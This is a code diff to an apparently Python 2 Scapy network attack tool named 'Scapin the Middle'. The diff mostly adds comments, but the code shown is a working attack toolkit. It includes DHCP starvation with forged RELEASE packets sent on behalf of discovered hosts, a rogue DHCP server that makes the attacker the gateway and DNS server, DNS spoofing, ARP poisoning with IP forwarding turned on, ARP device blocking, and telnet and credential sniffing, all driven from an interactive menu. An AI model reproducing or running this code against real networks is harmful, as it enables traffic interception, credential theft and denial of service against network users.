@@ -1,9 +1,9 @@
 #!/usr/bin/env python
-#import Thread
 
 # apt-get install python-netaddr
 # apt-get install python-netifaces
 # apt-get install scapy
+
 from scapy.all import *
 from time import sleep
 import os
@@ -290,7 +290,6 @@ class authentication_sniff(threading.Thread):
 	
 class dhcp_exhaust(threading.Thread):
 	terminated = False
-    
 	def is_stopped(self):
 		return self.terminated
 	def get_ipinfo(self,interface):
@@ -305,14 +304,14 @@ class dhcp_exhaust(threading.Thread):
 		ipaddr = '.'.join(iplist)
 		cidr = netaddr.IPNetwork('%s/%s' %(ipaddr,netmask))
 		return str(cidr)
-		
-	#NAME_SERVER=[x[1] for x in p[3].getlayer(DHCP).options if x[0] == 'name_server'][0]
+	
 	def start_attack(self):
 		global dhcp_name_server
 
 		m = str(RandMAC())
 		ans = False
 		logger.log("DHCP exhaustion started - ", "dhcp", 1)
+		#Send a first discover to get IP & Mac of the real DHCP + DNS IP
 		while not ans:
 			logger.log("Sending discover to gather real info ", "dhcp", 1)
 			dhcp_discover = Ether(src=m, dst="ff:ff:ff:ff:ff:ff")/IP(src="0.0.0.0", dst="255.255.255.255")/UDP(sport=68,dport=67)/\
@@ -327,20 +326,19 @@ class dhcp_exhaust(threading.Thread):
 				logger.log("DHCP found: " + gw_addr + " ("+ gw_mac + ") Nameserver : " + dhcp_name_server,  "dhcp", 1)
 
 		cidr = self.get_ipinfo(conf.iface)
-		#logger.log("[+] Interface CIDR: "+cidr, "dhcp", 1)
+		#Scan the network to get a Mac:IP association
 		ans,unans=arping(cidr,verbose=0)
 		ip_addr = [f[1].psrc for f in ans]
 		mac_addr = [f[1].hwsrc for f in ans] 
 
 		logger.log("Releasing hosts up :", "dhcp", 1)
-		# DHCP RELEASE
+		# DHCP RELEASE to hosts found
 		for ip_up,mac_up in zip(ip_addr, mac_addr):
-			#logger.log("[+] "+ip_up+" "+mac_up+" is up", "dhcp", 1)
 			dhcp_release = Ether(src=mac_up,dst=gw_mac)/IP(src=ip_up,dst=gw_addr)/UDP(sport=68,dport=67)/\
 	BOOTP(ciaddr=ip_up,chaddr=[mac2str(mac_up)])/DHCP(options=[("message-type","release"),"end"])
-			# Send DHCP RELEASE
 			sendp(dhcp_release,verbose=0)
 			logger.log("[+] "+ip_up+"("+mac_up+") RELEASED", "dhcp", 1)
+		#While the real DHCP answers, send discovers
 		while not self.terminated:
 			m = str(RandMAC())
 			xid=random.randint(0,0xFFFF)
@@ -352,7 +350,7 @@ class dhcp_exhaust(threading.Thread):
 				packet 	  = ans[0][1][DHCP].options[0][1] 
 				req_addr  = ans[0][1][BOOTP].yiaddr	
 				ip_server = ans[0][1][BOOTP].siaddr
-				
+				#Send requests if there is an offer
 				if packet == 2:
 					logger.log("[*] DHCP OFFER detected from "+ip_server, 'dhcp', 1)
 					logger.log("[+] Requesting the address "+req_addr, 'dhcp', 1)
@@ -361,14 +359,10 @@ class dhcp_exhaust(threading.Thread):
 					BOOTP(chaddr=[mac2str(m)],xid=xid)/DHCP(options=[("message-type","request"),("requested_addr",req_addr),("hostname",host_name),"end"])
 					ans,unans = srp(dhcp_request,verbose=0,timeout=5)
 					packet = ans[0][1][DHCP].options[0][1] 
-					
-				#	if packet == 5:
-				#		logger.log("[+] "+req_addr+" successfully exhausted!", 'dhcp', 1)
-				#	m = str(RandMAC())
+			
+				#no response from DHCP = attack successful
 				else:
 					logger.log("[-] No OFFER found - The DHCP is probably full", "dhcp", 1)
-
-
 			else:
 				logger.log("[-] No response from DHCP server", "dhcp", 1)
 				logger.log("[ ] DHCP Exhaustion stopped", "dhcp", 1)
@@ -384,33 +378,29 @@ class dhcp_server(threading.Thread):
 	terminated = False
  	client_num = 0
  	log = ""
- 	#server_ip="1.1.1.1" #IP attacker to put here
  	server_ip = netifaces.ifaddresses(conf.iface)[socket.AF_INET][0]['addr']
  	if dhcp_name_server == "":
 		dns_server = "8.8.8.8" #netifaces.ifaddresses(conf.iface)[socket.AF_INET][0]['addr']
 	else:
 		dns_server = dhcp_name_server
-	#server_mac="DE:AD:BE:EF:00:00" #Mac attacker to put here 
 	server_mac = netifaces.ifaddresses(conf.iface)[17][0]['addr']
-	#subnet_mask="255.255.255.0" #Mask to put here
 	server_ip  = netifaces.ifaddresses(conf.iface)[socket.AF_INET][0]['addr']
 	subnet_mask = netifaces.ifaddresses(conf.iface)[socket.AF_INET][0]['netmask']
 	gateway = netifaces.ifaddresses(conf.iface)[socket.AF_INET][0]['addr']
 	addrs_list = []
+	#build the list of IP of our subnet
 	[addrs_list.append('%s'%ip) for ip in netaddr.IPNetwork(netaddr.IPNetwork('%s/%s' %(server_ip,subnet_mask))).iter_hosts() if ('%s'%ip) != server_ip] 
 	def dhcp(self,p):
 		packet = p[DHCP].options[0][1]
 		client_ip=self.addrs_list[self.client_num] 
 		#Send DHCP OFFER if DHCP DISCOVER is detected
 		if packet == 1:
-			#print self.subnet_mask
 			logger.log("[*]DHCP Discover detected from "+p.src, "dhcp", 1)
 			dhcp_offer=Ether(src=self.server_mac,dst="\xff\xff\xff\xff\xff\xff")/IP(src=self.server_ip,dst="255.255.255.255")/UDP(sport=67,dport=68)/\
 			BOOTP(op=2, yiaddr=client_ip, siaddr=self.server_ip, chaddr=[mac2str(p.src)], xid=p[BOOTP].xid)/\
 			DHCP(options=[("message-type","offer")])/DHCP(options=[("subnet_mask",self.subnet_mask)])/DHCP(options=[("server_id",self.server_ip)])/\
 			DHCP(options=[("lease_time", 42000)])/\
 			DHCP(options=[("name_server",self.dns_server)])/DHCP(options=[("router",self.gateway),"end"])
-			#dhcp_offer.show()
 			sendp(dhcp_offer, count=1, verbose=0)
 			logger.log("[*]DHCP Offer sent to "+p.src, "dhcp", 1)
 		#Send DHCP ACK if DHCP REQUEST is detected
@@ -444,7 +434,6 @@ class telnet_sniff(threading.Thread):
 	client_server_assoc = []
 	terminated = False
 	def detect(self,p):
-		#return p.haslayer(TCP)
 		if p.haslayer(TCP) and p.haslayer(Raw):
 			return p.getlayer(TCP).sport == 23
    
@@ -513,6 +502,7 @@ class dns_spoof(threading.Thread):
 	def answer(self, req):
 		ip = req.getlayer(IP)
 		dns = req.getlayer(DNS)
+		#if the domain matches the input domain, send a fake answer
 		if self.domain in dns.qd.qname:
 			resp = IP(dst=ip.src, src=ip.dst)/UDP(dport=ip.sport,sport=ip.dport)
 			resp /= DNS(id=dns.id, qr=1, qd=dns.qd,an=DNSRR(rrname=dns.qd.qname, ttl=10, rdata=self.joker))
@@ -540,6 +530,7 @@ class arp_poison(threading.Thread):
 	attack = ""
 	def single_poison(self,ip, gw):
 		self.mac = getmacbyip(ip)
+		#if we can get the mac the of victim, send fake ARP who-has
 		if self.mac is not None:
 			logger.log("ARP single poison started : " + self.ip + " (" + self.mac +") GW: " + self.gw + " (FAKED: " + self.mymac + ")", "mitm", 1)
 			while self.terminated != True:	
@@ -550,12 +541,11 @@ class arp_poison(threading.Thread):
 			self.terminated = True
 			logger.log("ARP single poison FAILED to determine Mac address", "mitm", 1)
 	def range_poison(self, ip_range, gw):
-
+		#scan the network for the given range. (to prevent sending ARP to unknown hosts)
 		client_list = [(t[1][ARP].psrc,t[1][ARP].hwsrc) for t in arping(ip_range,verbose=0)[0]]
 		logger.log("ARP range poison started: " + self.ip + " GW: " + self.gw + " (FAKED: " + self.mymac + ")", "mitm", 1)
 		for client in client_list:
 			logger.log(client[0] + " - " + client[1],"mitm", 1)
-
 		while not self.terminated:
 			for client in client_list:
 				p1 = Ether(dst=client[0])/ARP(op="who-has", psrc=gw, pdst=client[0])
@@ -563,7 +553,6 @@ class arp_poison(threading.Thread):
 			sleep(5)
 	def __init__(self, ip, gw=[g[2] for g in conf.route.routes if g[2] != "0.0.0.0"][0]):
 		threading.Thread.__init__(self)	
-
 		os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
 		self.terminated = False
 		self.ip = ip
@@ -571,16 +560,17 @@ class arp_poison(threading.Thread):
 		self.mymac = netifaces.ifaddresses(conf.iface)[netifaces.AF_LINK][0]['addr']
 
 	def run(self):
+		# if "-" in the IP given: it's a range.
 		if "-" in self.ip:
 			getattr(arp_poison, 'range_poison')(self,self.ip,self.gw)
 		else:
-
 			getattr(arp_poison,'single_poison')(self,self.ip,self.gw)
 	def stop(self):
 		logger.log("ARP poison stopped", "mitm", 1)
 		self.terminated = True
 
 class arp_block(threading.Thread):
+	#Everything here is the same as arp_poison, except the fake mac sent.
 	def __init__(self,ip,gw):
 		threading.Thread.__init__(self)	
 		self.terminated = False
@@ -615,13 +605,12 @@ class arp_block(threading.Thread):
 			getattr(arp_block,'single_block')(self,self.ip,self.gw)
 	def stop(self):
 		self.terminated = True
-class menu:
+class menu:	
 	global actifs
 	@classmethod
 	def show(self, msg=""):
+		#print the last message if there is one. (messages are in a list)
 		global menu_message
-		#print threading.activeCount()
-		#print threading.enumerate()
 		if msg != "":
 			for m in msg:
 				print "[+] "+ m
@@ -677,12 +666,14 @@ class menu:
 			pass
 	@classmethod
 	def exit(self):
+	#own exit method to terminate all on-going attacks
 		for attackThread in actifs:
 			if actifs[attackThread] is not None:
 				actifs[attackThread].terminated = True
 		sys.exit()
 	@classmethod
 	def dns_spoof(self):
+	#interactive parmaters retrieving
 		global menu_message
 		if actifs['DNS_spoof'] == None:
 			menu_message = ["DNS Spoof started !", "Log path: "+ log_path + "mitm.log"]
@@ -757,6 +748,8 @@ class menu:
 			actifs['mail_sniff'] = None	
 	@classmethod
 	def arp_mitm(self):
+	#interactive parameters retrieving
+
 		global menu_message
 		if actifs['arp_mitm'] == None:
 			target_ip = raw_input("Target IP (ex:192.168.1.1) or Range (ex:192.168.1.1-10):\n\t> ")
@@ -772,6 +765,7 @@ class menu:
 
 	@classmethod
 	def arp_block_device(self):
+	#interactive parameters retrieving
 		global menu_message
 		if actifs['arp_block'] == None:
 			ip = raw_input("Target IP: ")
@@ -785,6 +779,7 @@ class menu:
 			actifs['arp_block'] = None
 			menu_message = ["ARP device blocking stopped !"]
 if __name__ == "__main__":
+#if the script is running on its own, show the menu
 	global menu_message
 	menu_message = ["Welcome to SCAPIN THE MIDDLE !"]
 	while 1:
